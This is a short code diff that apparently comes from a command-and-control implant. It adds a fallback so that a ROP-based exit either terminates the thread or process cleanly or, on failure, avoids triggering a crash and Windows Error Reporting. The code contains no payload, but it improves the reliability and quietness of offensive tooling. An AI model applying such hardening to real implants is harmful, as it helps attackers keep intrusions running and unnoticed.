@@ -3557,6 +3557,13 @@ VOID CommandExit( PPARSER Parser )
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.NtContinue( &RopExit, FALSE );
 
+    /* Fallback: if NtContinue returns (ROP chain failed), exit directly
+     * to prevent an unhandled exception → APPCRASH → WER → pool exhaustion. */
+    if ( ExitMethod == 1 )
+        Instance->Win32.RtlExitUserThread( STATUS_SUCCESS );
+    else
+        Instance->Win32.RtlExitUserProcess( STATUS_SUCCESS );
+
 #else
 
     // TODO: cleanup memory
